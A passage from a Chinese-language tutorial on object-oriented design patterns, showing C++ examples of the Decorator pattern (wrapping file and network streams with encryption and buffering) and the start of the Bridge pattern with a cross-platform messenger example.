FileStream&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">char</span> <span class="hljs-title">Read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> number)</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Seek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">position</span>)</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Write</span><span class="hljs-params">(<span class="hljs-keyword">byte</span> data)</span></span>&#123;...&#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>大量重复代码，类数量随功能数增长很快。</p><p>实现二，使用组合而不是继承。将功能抽象成一种装饰类。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 基类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Stream</span>&#123;</span><br><span class="hljs-keyword">public</span>：<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">char</span> <span class="hljs-title">Read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> number)</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Seek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">position</span>)</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Write</span><span class="hljs-params">(<span class="hljs-keyword">char</span> data)</span></span>=<span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">Stream</span>()&#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">// 2种流数据</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileStream</span>:</span> <span class="hljs-keyword">public</span> <span class="hljs-built_in">Stream</span>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">char</span> <span class="hljs-title">Read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> number)</span></span>&#123;读文件流&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Seek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">position</span>)</span></span>&#123;定位文件流&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Write</span><span class="hljs-params">(<span class="hljs-keyword">char</span> data)</span></span>&#123;写文件流&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NetworkStream</span> :</span><span class="hljs-keyword">public</span> <span class="hljs-built_in">Stream</span>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">char</span> <span class="hljs-title">Read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> number)</span></span>&#123;读网络流&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Seek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">position</span>)</span></span>&#123;定位网络流&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Write</span><span class="hljs-params">(<span class="hljs-keyword">char</span> data)</span></span>&#123;写网络流&#125;<br>&#125;;<br><br><span class="hljs-comment">// 组合而不是继承</span><br><span class="hljs-comment">// public Stream继承是为了规范接口；而Stream* stream成员是装饰组合的关键</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CryptoStream</span>:</span> <span class="hljs-keyword">public</span> <span class="hljs-built_in">Stream</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-built_in">Stream</span>* stream;<br><br><span class="hljs-keyword">public</span>:<br>    CryptoStream(<span class="hljs-built_in">Stream</span>* stream):stream(stream)&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">char</span> <span class="hljs-title">Read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> number)</span></span>&#123;<br>        <span class="hljs-comment">//额外的加密操作...</span><br>        stream-&gt;Read(number);<span class="hljs-comment">//读文件流</span><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Seek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">position</span>)</span></span>&#123;<br>        <span class="hljs-comment">//额外的加密操作...</span><br>        stream::Seek(<span class="hljs-built_in">position</span>);<span class="hljs-comment">//定位文件流</span><br>        <span class="hljs-comment">//额外的加密操作...</span><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Write</span><span class="hljs-params">(<span class="hljs-keyword">byte</span> data)</span></span>&#123;<br>        <span class="hljs-comment">//额外的加密操作...</span><br>        stream::Write(data);<span class="hljs-comment">//写文件流</span><br>        <span class="hljs-comment">//额外的加密操作...</span><br>    &#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BufferedStream</span> :</span> <span class="hljs-keyword">public</span> <span class="hljs-built_in">Stream</span>&#123;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-built_in">Stream</span>* stream;<br>    <br><span class="hljs-keyword">public</span>:<br>    BufferedStream(<span class="hljs-built_in">Stream</span>* stream):stream(stream)&#123;&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">char</span> <span class="hljs-title">Read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> number)</span></span>&#123;<br>        <span class="hljs-comment">//额外的缓冲操作...</span><br>        stream-&gt;Read(number);<span class="hljs-comment">//读文件流</span><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Seek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">position</span>)</span></span>&#123;<br>        <span class="hljs-comment">//额外的缓冲操作...</span><br>        stream::Seek(<span class="hljs-built_in">position</span>);<span class="hljs-comment">//定位文件流</span><br>        <span class="hljs-comment">//额外的缓冲操作...</span><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Write</span><span class="hljs-params">(<span class="hljs-keyword">byte</span> data)</span></span>&#123;<br>        <span class="hljs-comment">//额外的缓冲操作...</span><br>        stream::Write(data);<span class="hljs-comment">//写文件流</span><br>        <span class="hljs-comment">//额外的缓冲操作...</span><br>    &#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    FileStream* s1=<span class="hljs-keyword">new</span> FileStream();<br>    CryptoStream* s2=<span class="hljs-keyword">new</span> CryptoStream(s1);<br>    BufferedStream* s3=<span class="hljs-keyword">new</span> BufferedStream(s1);<br>    <br>    BufferedStream* bufferedCryptoStm=<span class="hljs-keyword">new</span> BufferedStream(s2);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>实现三，将拥有共同成员的BufferedStream和CryptoStream再抽象出一个父类。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 基类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Stream</span>&#123;</span><br>...<br>&#125;;<br><br><span class="hljs-comment">// 2种流数据</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileStream</span>:</span> <span class="hljs-keyword">public</span> <span class="hljs-built_in">Stream</span>&#123;<br>...<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NetworkStream</span> :</span><span class="hljs-keyword">public</span> <span class="hljs-built_in">Stream</span>&#123;<br>...<br>&#125;;<br><br><span class="hljs-comment">// 抽象一个父类</span><br>DecoratorStream: <span class="hljs-keyword">public</span> <span class="hljs-built_in">Stream</span>&#123;<br><span class="hljs-keyword">protected</span>:<br>    <span class="hljs-built_in">Stream</span>* stream;<br>    DecoratorStream(<span class="hljs-built_in">Stream</span> * stm):stream(stm)&#123;...&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CryptoStream</span>:</span> <span class="hljs-keyword">public</span> DecoratorStream &#123;<br><span class="hljs-keyword">public</span>:<br>    CryptoStream(<span class="hljs-built_in">Stream</span>* stream):DecoratorStream(stream)&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">char</span> <span class="hljs-title">Read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> number)</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Seek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">position</span>)</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Write</span><span class="hljs-params">(<span class="hljs-keyword">byte</span> data)</span></span>&#123;...&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BufferedStream</span> :</span> <span class="hljs-keyword">public</span> DecoratorStream&#123;<br><span class="hljs-keyword">public</span>:<br>    BufferedStream(<span class="hljs-built_in">Stream</span>* stream):DecoratorStream(stream)&#123;&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">char</span> <span class="hljs-title">Read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> number)</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Seek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">position</span>)</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Write</span><span class="hljs-params">(<span class="hljs-keyword">byte</span> data)</span></span>&#123;...&#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>以下情况使用 Decorator模式</p><ol type="1"><li>在不影响其他对象的情况下，以动态、透明的方式给单个对象添加职责。</li><li>处理那些可以撤消的职责。</li><li>当不能采用生成子类的方法进行扩充时。一种情况是，可能有大量独立的扩展，为支持每一种组合将产生大量的子类，使得子类数目呈爆炸性增长。另一种情况可能是因为类定义被隐藏，或类定义不能用于生成子类。</li></ol><p>抽象结构如下：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/24/11-35-26-fa8dd9.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><h4><span id="抽象代码结构">抽象代码结构</span></h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Component</span><br><span class="hljs-comment"> * defines an interface for objects that can have responsibilities</span><br><span class="hljs-comment"> * added to them dynamically</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Component</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~Component() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">operation</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Concrete Component</span><br><span class="hljs-comment"> * defines an object to which additional responsibilities</span><br><span class="hljs-comment"> * can be attached</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteComponent</span> :</span> <span class="hljs-keyword">public</span> Component<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcreteComponent() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">operation</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Concrete Component operation"</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Decorator</span><br><span class="hljs-comment"> * maintains a reference to a Component object and defines an interface</span><br><span class="hljs-comment"> * that conforms to Component's interface</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Decorator</span> :</span> <span class="hljs-keyword">public</span> Component<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~Decorator() &#123;&#125;<br>  <br>  Decorator( Component *c ) : component( c ) &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">operation</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    component-&gt;operation();<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">private</span>:<br>  Component *component;<br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Concrete Decorators</span><br><span class="hljs-comment"> * add responsibilities to the component (can extend the state</span><br><span class="hljs-comment"> * of the component)</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteDecoratorA</span> :</span> <span class="hljs-keyword">public</span> Decorator<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ConcreteDecoratorA( Component *c ) : Decorator( c ) &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">operation</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    Decorator::operation();<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Decorator A"</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteDecoratorB</span> :</span> <span class="hljs-keyword">public</span> Decorator<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ConcreteDecoratorB( Component *c ) : Decorator( c ) &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">operation</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    Decorator::operation();<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Decorator B"</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  ConcreteComponent  *cc = <span class="hljs-keyword">new</span> ConcreteComponent();<br>  ConcreteDecoratorB *db = <span class="hljs-keyword">new</span> ConcreteDecoratorB( cc );<br>  ConcreteDecoratorA *da = <span class="hljs-keyword">new</span> ConcreteDecoratorA( db );<br>  <br>  Component *component = da;<br>  component-&gt;operation();<br>  <br>  <span class="hljs-keyword">delete</span> da;<br>  <span class="hljs-keyword">delete</span> db;<br>  <span class="hljs-keyword">delete</span> cc;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>通过采用组合而非继承的手法，Decorator模式实现了在运行时动态扩展对象功能的能力，而且可以根据需要扩展多个功能。</p><p>Decorator类在接口上表现为is-aComponent的继承关系，即Decorator类继承了Component类所具有的接口。但在实现上又表现为has-aComponent的组合关系，即Decorator类又使用了另外一个Component类。</p><h3><span id="bridge">Bridge</span></h3><p>将抽象部分(业务功能)与实现部分(平台实现)分离，使它们都可以独立地变化。</p><p>简单来讲，就是将变化划分成不同的类别，通过父类统一某一类变化的接口。通过组合抽象父类的指针成员，达到简化代码的目的。有点抽象，看示例。</p><h4><span id="示例6">示例6</span></h4><p>实现一个消息通知程序，再不同的使用平台，有不同的表现形式。</p><p>实现一，通过类继承，达到适应不同平台的目的。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 纯虚基类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Messager</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Login</span><span class="hljs-params">(<span class="hljs-built_in">string</span> username, <span class="hljs-built_in">string</span> password)</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SendMessage</span><span class="hljs-params">(<span class="hljs-built_in">string</span> message)</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SendPicture</span><span class="hljs-params">(Image <span class="hljs-built_in">image</span>)</span></span>=<span class="hljs-number">0</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">PlaySound</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">DrawShape</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">WriteText</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Connect</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-keyword">virtual</span> ~Messager()&#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">// 平台实现</span><br><span class="hljs-comment">// 注意这里 PCMessagerBase 依然有纯虚函数(Login等)，不能实例化</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PCMessagerBase</span> :</span> <span class="hljs-keyword">public</span> Messager&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">PlaySound</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">DrawShape</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">WriteText</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Connect</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MobileMessagerBase</span> :</span> <span class="hljs-keyword">public</span> Messager&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">PlaySound</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">DrawShape</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">WriteText</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Connect</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>&#125;;<br><br><span class="hljs-comment">// 业务抽象</span><br><span class="hljs-comment">// 这里的类数，在平台实现类数基础上成倍增长</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PCMessagerLite</span> :</span> <span class="hljs-keyword">public</span> PCMessagerBase &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Login</span><span class="hljs-params">(<span class="hljs-built_in">string</span> username, <span class="hljs-built_in">string</span> password)</span></span>&#123;<br>        PCMessagerBase::Connect();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SendMessage</span><span class="hljs-params">(<span class="hljs-built_in">string</span> message)</span></span>&#123;<br>        PCMessagerBase::WriteText();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SendPicture</span><span class="hljs-params">(Image <span class="hljs-built_in">image</span>)</span></span>&#123;<br>        PCMessagerBase::DrawShape();<br>    &#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PCMessagerPerfect</span> :</span> <span class="hljs-keyword">public</span> PCMessagerBase &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Login</span><span class="hljs-params">(<span class="hljs-built_in">string</span> username, <span class="hljs-built_in">string</span> password)</span></span>&#123;<br>        PCMessagerBase::PlaySound();<br>        PCMessagerBase::Connect();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SendMessage</span><span class="hljs-params">(<span class="hljs-built_in">string</span> message)</span></span>&#123;<br>        PCMessagerBase::PlaySound();<br>        PCMessagerBase::WriteText();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SendPicture</span><span class="hljs-params">(Image <span 